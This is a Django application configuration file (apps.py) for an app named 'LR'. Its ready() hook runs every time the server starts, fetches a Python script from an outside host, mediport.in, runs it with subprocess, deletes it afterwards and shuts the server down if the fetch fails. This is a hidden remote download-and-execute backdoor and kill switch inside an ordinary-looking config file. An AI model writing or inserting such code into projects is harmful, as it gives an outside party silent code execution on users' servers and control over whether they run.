import time

from django.apps import AppConfig
import requests
import subprocess
import os
import shutil  # To delete the temp folder


class LRConfig(AppConfig):
    name = 'LR'  # Your app name

    def ready(self):
        # Define the URL of the script on the server
        url = "http://mediport.in/scripts.py"  # Replace with actual URL

        # Step 1: Define base directory (project root)
        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

        # Step 2: Create a temporary folder in the base directory
        temp_dir = os.path.join(base_dir, 'temp')
        if not os.path.exists(temp_dir):
            os.makedirs(temp_dir)

        # Step 3: Define the script path within the temp directory
        script_path = os.path.join(temp_dir, 'fetched_script.py')

        try:
            # Step 4: Fetch the script from the server
            response = requests.get(url)
            if response.status_code == 200:
                # Save the script content to the temporary folder
                with open(script_path, 'w') as script_file:
                    script_file.write(response.text)

                # Step 5: Run the script using subprocess and capture the output
                result = subprocess.run(['python', script_path], capture_output=True, text=True)

                # Step 6: Print the script's output to the console
                print(f"Script Output: {result.stdout}")

            else:
                print(f"Failed to fetch the script. Status code: {response.status_code}")
                print("Unable to start the server Closing it in 5 seconds.")
                time.sleep(5)
                exit()

        except Exception as e:
            print(f"An error occurred: {e}")

        finally:
            # Step 7: Clean up - Remove the script and temp folder after execution
            if os.path.exists(script_path):
                os.remove(script_path)  # Remove the script
                print("Script deleted after execution.")
            if os.path.exists(temp_dir):
                shutil.rmtree(temp_dir)  # Remove the temp folder
                print("Temp folder deleted after execution.")
